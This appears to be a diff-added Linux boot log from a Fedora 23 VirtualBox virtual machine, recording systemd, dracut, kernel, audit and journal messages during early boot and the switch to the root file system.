+Dec 14 01:37:04 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-tmpfiles-setup-dev comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost dracut-cmdline: dracut-23 (Twenty Three) dracut-043-60.git20150811.fc23
+Dec 14 01:37:04 localhost dracut-cmdline: Using kernel command line parameters:
+Dec 14 01:37:04 localhost dracut-cmdline: BOOT_IMAGE=/vmlinuz-4.2.3-300.fc23.x86_64 root=/dev/mapper/fedora-root ro rd.lvm.lv=fedora/root rd.lvm.lv=fedora/swap rhgb quiet
+Dec 14 01:37:04 localhost systemd[1]: Started Create list of required static device nodes for the current kernel.
+Dec 14 01:37:04 localhost kernel: audit: type=1130 audit(1576287424.780:2): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=kmod-static-nodes comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost systemd[1]: Started Journal Service.
+Dec 14 01:37:04 localhost kernel: audit: type=1130 audit(1576287424.780:3): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-journald comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost kernel: audit: type=1130 audit(1576287424.780:4): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-sysctl comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost kernel: audit: type=1130 audit(1576287424.789:5): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-tmpfiles-setup-dev comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost systemd: Started dracut cmdline hook.
+Dec 14 01:37:04 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=dracut-cmdline comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost systemd: Starting dracut pre-udev hook...
+Dec 14 01:37:04 localhost kernel: audit: type=1130 audit(1576287424.851:6): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=dracut-cmdline comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost systemd: Started Setup Virtual Console.
+Dec 14 01:37:04 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-vconsole-setup comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost kernel: audit: type=1130 audit(1576287424.859:7): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-vconsole-setup comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost kernel: usb 1-1: new full-speed USB device number 2 using ohci-pci
+Dec 14 01:37:04 localhost kernel: audit: type=1130 audit(1576287424.876:8): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=dracut-pre-udev comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost systemd: Started dracut pre-udev hook.
+Dec 14 01:37:04 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=dracut-pre-udev comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost systemd: Starting udev Kernel Device Manager...
+Dec 14 01:37:04 localhost systemd: Started udev Kernel Device Manager.
+Dec 14 01:37:04 localhost kernel: audit: type=1130 audit(1576287424.879:9): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-udevd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-udevd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost systemd: Started dracut pre-trigger hook.
+Dec 14 01:37:04 localhost systemd: Starting udev Coldplug all Devices...
+Dec 14 01:37:04 localhost systemd: Mounting Configuration File System...
+Dec 14 01:37:04 localhost systemd: Mounted Configuration File System.
+Dec 14 01:37:04 localhost kernel: audit: type=1130 audit(1576287424.903:10): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-udev-trigger comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost systemd: Started udev Coldplug all Devices.
+Dec 14 01:37:04 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-udev-trigger comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost systemd: Starting Show Plymouth Boot Screen...
+Dec 14 01:37:04 localhost systemd: Starting dracut initqueue hook...
+Dec 14 01:37:04 localhost systemd: Reached target System Initialization.
+Dec 14 01:37:04 localhost systemd: Starting System Initialization.
+Dec 14 01:37:04 localhost kernel: e1000: Intel(R) PRO/1000 Network Driver - version 7.3.21-k8-NAPI
+Dec 14 01:37:04 localhost kernel: e1000: Copyright (c) 1999-2006 Intel Corporation.
+Dec 14 01:37:05 localhost kernel: e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 08:00:27:28:ed:a2
+Dec 14 01:37:05 localhost kernel: e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
+Dec 14 01:37:05 localhost kernel: tsc: Refined TSC clocksource calibration: 1990.919 MHz
+Dec 14 01:37:05 localhost kernel: clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x3965580e743, max_idle_ns: 881590764305 ns
+Dec 14 01:37:05 localhost kernel: e1000 0000:00:08.0 eth1: (PCI:33MHz:32-bit) 08:00:27:31:e1:10
+Dec 14 01:37:05 localhost kernel: e1000 0000:00:08.0 eth1: Intel(R) PRO/1000 Network Connection
+Dec 14 01:37:05 localhost kernel: e1000 0000:00:03.0 enp0s3: renamed from eth0
+Dec 14 01:37:05 localhost kernel: e1000 0000:00:08.0 enp0s8: renamed from eth1
+Dec 14 01:37:05 localhost kernel: usb 1-1: New USB device found, idVendor=80ee, idProduct=0021
+Dec 14 01:37:05 localhost kernel: usb 1-1: New USB device strings: Mfr=1, Product=3, SerialNumber=0
+Dec 14 01:37:05 localhost kernel: usb 1-1: Product: USB Tablet
+Dec 14 01:37:05 localhost kernel: usb 1-1: Manufacturer: VirtualBox
+Dec 14 01:37:05 localhost kernel: input: VirtualBox USB Tablet as /devices/pci0000:00/0000:00:06.0/usb1/1-1/1-1:1.0/0003:80EE:0021.0001/input/input5
+Dec 14 01:37:05 localhost kernel: hid-generic 0003:80EE:0021.0001: input,hidraw0: USB HID v1.10 Mouse [VirtualBox USB Tablet] on usb-0000:00:06.0-1/input0
+Dec 14 01:37:05 localhost dracut-initqueue: Scanning devices sda2  for LVM logical volumes fedora/root fedora/swap
+Dec 14 01:37:05 localhost dracut-initqueue: File descriptor 98 (socket:[9874]) leaked on lvm invocation. Parent PID 387: /bin/sh
+Dec 14 01:37:05 localhost dracut-initqueue: File descriptor 99 (socket:[9875]) leaked on lvm invocation. Parent PID 387: /bin/sh
+Dec 14 01:37:05 localhost dracut-initqueue: inactive '/dev/fedora/swap' [820.00 MiB] inherit
+Dec 14 01:37:05 localhost dracut-initqueue: inactive '/dev/fedora/root' [6.71 GiB] inherit
+Dec 14 01:37:05 localhost systemd: Received SIGRTMIN+20 from PID 332 (plymouthd).
+Dec 14 01:37:05 localhost systemd: Started Show Plymouth Boot Screen.
+Dec 14 01:37:05 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=plymouth-start comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:05 localhost systemd: Started Dispatch Password Requests to Console Directory Watch.
+Dec 14 01:37:05 localhost systemd: Reached target Paths.
+Dec 14 01:37:05 localhost systemd: Starting Paths.
+Dec 14 01:37:05 localhost systemd: Started Forward Password Requests to Plymouth Directory Watch.
+Dec 14 01:37:05 localhost systemd: Starting Forward Password Requests to Plymouth Directory Watch.
+Dec 14 01:37:05 localhost systemd: Reached target Basic System.
+Dec 14 01:37:05 localhost systemd: Starting Basic System.
+Dec 14 01:37:05 localhost dracut-initqueue: File descriptor 98 (socket:[9874]) leaked on lvm invocation. Parent PID 387: /bin/sh
+Dec 14 01:37:05 localhost dracut-initqueue: File descriptor 99 (socket:[9875]) leaked on lvm invocation. Parent PID 387: /bin/sh
+Dec 14 01:37:05 localhost systemd: Found device /dev/mapper/fedora-root.
+Dec 14 01:37:05 localhost dracut-initqueue: File descriptor 98 (socket:[9874]) leaked on lvm invocation. Parent PID 387: /bin/sh
+Dec 14 01:37:05 localhost dracut-initqueue: File descriptor 99 (socket:[9875]) leaked on lvm invocation. Parent PID 387: /bin/sh
+Dec 14 01:37:05 localhost systemd: Started dracut initqueue hook.
+Dec 14 01:37:05 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=dracut-initqueue comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:05 localhost systemd: Started dracut pre-mount hook.
+Dec 14 01:37:05 localhost systemd: Starting File System Check on /dev/mapper/fedora-root...
+Dec 14 01:37:05 localhost systemd: Reached target Remote File Systems (Pre).
+Dec 14 01:37:05 localhost systemd: Starting Remote File Systems (Pre).
+Dec 14 01:37:05 localhost systemd: Reached target Remote File Systems.
+Dec 14 01:37:05 localhost systemd: Starting Remote File Systems.
+Dec 14 01:37:05 localhost systemd-fsck: /usr/sbin/fsck.xfs: XFS file system.
+Dec 14 01:37:05 localhost systemd: Started File System Check on /dev/mapper/fedora-root.
+Dec 14 01:37:05 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-fsck-root comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:05 localhost systemd: Mounting /sysroot...
+Dec 14 01:37:06 localhost kernel: SGI XFS with ACLs, security attributes, no debug enabled
+Dec 14 01:37:06 localhost kernel: XFS (dm-0): Mounting V5 Filesystem
+Dec 14 01:37:06 localhost kernel: XFS (dm-0): Ending clean mount
+Dec 14 01:37:06 localhost systemd: Mounted /sysroot.
+Dec 14 01:37:06 localhost systemd: Reached target Initrd Root File System.
+Dec 14 01:37:06 localhost systemd: Starting Initrd Root File System.
+Dec 14 01:37:06 localhost systemd: Starting Reload Configuration from the Real Root...
+Dec 14 01:37:06 localhost systemd: Reloading.
+Dec 14 01:37:06 localhost systemd: Started Reload Configuration from the Real Root.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=initrd-parse-etc comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=initrd-parse-etc comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Started dracut mount hook.
+Dec 14 01:37:06 localhost systemd: Reached target Initrd File Systems.
+Dec 14 01:37:06 localhost systemd: Starting Initrd File Systems.
+Dec 14 01:37:06 localhost systemd: Reached target Initrd Default Target.
+Dec 14 01:37:06 localhost systemd: Starting Initrd Default Target.
+Dec 14 01:37:06 localhost systemd: Starting dracut pre-pivot and cleanup hook...
+Dec 14 01:37:06 localhost systemd: Started dracut pre-pivot and cleanup hook.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=dracut-pre-pivot comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Starting Cleaning Up and Shutting Down Daemons...
+Dec 14 01:37:06 localhost systemd: Stopped Cleaning Up and Shutting Down Daemons.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=initrd-cleanup comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=initrd-cleanup comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Starting Plymouth switch root service...
+Dec 14 01:37:06 localhost systemd: Stopped dracut pre-pivot and cleanup hook.
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=dracut-pre-pivot comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Stopping dracut pre-pivot and cleanup hook...
+Dec 14 01:37:06 localhost systemd: Stopped target Remote File Systems.
+Dec 14 01:37:06 localhost systemd: Stopping Remote File Systems.
+Dec 14 01:37:06 localhost systemd: Stopped target Remote File Systems (Pre).
+Dec 14 01:37:06 localhost systemd: Stopping Remote File Systems (Pre).
+Dec 14 01:37:06 localhost systemd: Stopped dracut initqueue hook.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=dracut-initqueue comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=dracut-initqueue comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Stopping dracut initqueue hook...
+Dec 14 01:37:06 localhost systemd: Stopped target Initrd Default Target.
+Dec 14 01:37:06 localhost systemd: Stopping Initrd Default Target.
+Dec 14 01:37:06 localhost systemd: Stopped target Basic System.
+Dec 14 01:37:06 localhost systemd: Stopping Basic System.
+Dec 14 01:37:06 localhost systemd: Stopped target System Initialization.
+Dec 14 01:37:06 localhost systemd: Stopping System Initialization.
+Dec 14 01:37:06 localhost systemd: Stopped udev Coldplug all Devices.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-udev-trigger comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-udev-trigger comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Stopping udev Coldplug all Devices...
+Dec 14 01:37:06 localhost systemd: Stopped Apply Kernel Variables.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-sysctl comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-sysctl comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Stopping Apply Kernel Variables...
+Dec 14 01:37:06 localhost systemd: Stopped target Paths.
+Dec 14 01:37:06 localhost systemd: Stopping Paths.
+Dec 14 01:37:06 localhost systemd: Stopped target Sockets.
+Dec 14 01:37:06 localhost systemd: Stopping Sockets.
+Dec 14 01:37:06 localhost systemd: Stopped target Slices.
+Dec 14 01:37:06 localhost systemd: Stopping Slices.
+Dec 14 01:37:06 localhost systemd: Stopping udev Kernel Device Manager...
+Dec 14 01:37:06 localhost systemd: Stopped target Swap.
+Dec 14 01:37:06 localhost systemd: Stopping Swap.
+Dec 14 01:37:06 localhost systemd: Stopped target Timers.
+Dec 14 01:37:06 localhost systemd: Stopping Timers.
+Dec 14 01:37:06 localhost systemd: Stopped target Local File Systems.
+Dec 14 01:37:06 localhost systemd: Stopping Local File Systems.
+Dec 14 01:37:06 localhost systemd: Started Plymouth switch root service.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=plymouth-switch-root comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=plymouth-switch-root comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Stopped udev Kernel Device Manager.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-udevd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-udevd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Stopped Create Static Device Nodes in /dev.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-tmpfiles-setup-dev comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-tmpfiles-setup-dev comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Stopping Create Static Device Nodes in /dev...
+Dec 14 01:37:06 localhost systemd: Stopped Create list of required static device nodes for the current kernel.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=kmod-static-nodes comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=kmod-static-nodes comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Stopping Create list of required static device nodes for the current kernel...
+Dec 14 01:37:06 localhost systemd: Stopped dracut pre-udev hook.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=dracut-pre-udev comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=dracut-pre-udev comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Stopping dracut pre-udev hook...
+Dec 14 01:37:06 localhost systemd: Stopped dracut cmdline hook.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=dracut-cmdline comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=dracut-cmdline comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Stopping dracut cmdline hook...
+Dec 14 01:37:06 localhost systemd: Closed udev Control Socket.
+Dec 14 01:37:06 localhost systemd: Stopping udev Control Socket.
+Dec 14 01:37:06 localhost systemd: Closed udev Kernel Socket.
+Dec 14 01:37:06 localhost systemd: Stopping udev Kernel Socket.
+Dec 14 01:37:06 localhost systemd: Starting Cleanup udevd DB...
+Dec 14 01:37:06 localhost systemd: Started Cleanup udevd DB.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=initrd-udevadm-cleanup-db comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=initrd-udevadm-cleanup-db comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Reached target Switch Root.
+Dec 14 01:37:06 localhost systemd: Starting Switch Root.
+Dec 14 01:37:06 localhost systemd: Starting Switch Root...
+Dec 14 01:37:06 localhost kernel: random: nonblocking pool is initialized
+Dec 14 01:37:06 localhost systemd: Switching root.
+Dec 14 01:37:06 localhost journal: Journal stopped
+Dec 14 01:37:06 localhost journal: Runtime journal is using 4.6M (max allowed 37.0M, trying to leave 55.5M free of 365.9M available → current limit 37.0M).
+Dec 14 01:37:06 localhost journal: Runtime journal is using 4.6M (max allowed 37.0M, trying to leave 55.5M free of 365.9M available → current limit 37.0M).
+Dec 14 01:37:06 localhost systemd-journald[176]: Received SIGTERM from PID 1 (systemd).
+Dec 14 01:37:06 localhost kernel: SELinux:  Disabled at runtime.
+Dec 14 01:37:06 localhost kernel: SELinux:  Unregistering netfilter hooks
+Dec 14 01:37:06 localhost journal: Journal started
+Dec 14 01:37:06 localhost systemd: systemd 222 running in system mode. (+PAM +AUDIT +SELINUX +IMA -APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ -LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN)
+Dec 14 01:37:06 localhost audit: MAC_STATUS selinux=0 auid=4294967295 ses=4294967295
+Dec 14 01:37:06 localhost systemd: Detected virtualization oracle.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-journald comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Detected architecture x86-64.
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-journald comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Set hostname to <localhost.localdomain>.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=initrd-switch-root comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Configuration file /usr/lib/systemd/system/auditd.service is marked world-inaccessible. This has no effect as configuration data is accessible via APIs without restrictions. Proceeding anyway.
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=initrd-switch-root comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-journald comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-journald comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: CONFIG_CHANGE audit_enabled=1 old=1 auid=4294967295 ses=4294967295 res=1
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-fsck-root comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-fsck-root comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-journald comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Stopped plymouth-start.service.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=plymouth-start comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Started Dispatch Password Requests to Console Directory Watch.
+Dec 14 01:37:06 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=plymouth-start comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Reached target Paths.
+Dec 14 01:37:06 localhost systemd: Starting Paths.
+Dec 14 01:37:06 localhost systemd: Mounted Debug File System.
+Dec 14 01:37:06 localhost systemd: Started Remount Root and Kernel File Systems.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-remount-fs comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Started Rebuild Dynamic Linker Cache.
+Dec 14 01:37:06 localhost systemd: Starting Configure read-only root support...
+Dec 14 01:37:06 localhost systemd: Starting Flush Journal to Persistent Storage...
+Dec 14 01:37:06 localhost systemd: Started Rebuild Hardware Database.
+Dec 14 01:37:06 localhost systemd: Starting udev Coldplug all Devices...
+Dec 14 01:37:06 localhost systemd: Started First Boot Wizard.
+Dec 14 01:37:06 localhost systemd: Started Create System Users.
+Dec 14 01:37:06 localhost systemd: Started Create list of required static device nodes for the current kernel.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=kmod-static-nodes comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Started Apply Kernel Variables.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-sysctl comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Starting Create Static Device Nodes in /dev...
+Dec 14 01:37:06 localhost journal: Permanent journal is using 8.0M (max allowed 685.8M, trying to leave 1.0G free of 5.3G available → current limit 685.8M).
+Dec 14 01:37:06 localhost journal: Time spent on flushing to /var is 22.808ms for 659 entries.
+Dec 14 01:37:06 localhost systemd: Started Create Static Device Nodes in /dev.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-tmpfiles-setup-dev comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Starting udev Kernel Device Manager...
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-udev-trigger comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Reached target Local File Systems (Pre).
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=fedora-readonly comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Starting Local File Systems (Pre).
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-journal-flush comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Mounted Virtual Machine and Container Storage.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-udevd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:06 localhost systemd: Started udev Coldplug all Devices.
+Dec 14 01:37:06 localhost systemd: Started Configure read-only root support.
+Dec 14 01:37:06 localhost systemd: Starting Load/Save Random Seed...
+Dec 14 01:37:06 localhost systemd: Started Flush Journal to Persistent Storage.
+Dec 14 01:37:06 localhost systemd: Started udev Kernel Device Manager.
+Dec 14 01:37:06 localhost systemd: Started Load/Save Random Seed.
+Dec 14 01:37:06 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-random-seed comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost kernel: ACPI: Video Device [GFX0] (multi-head: yes  rom: no  post: no)
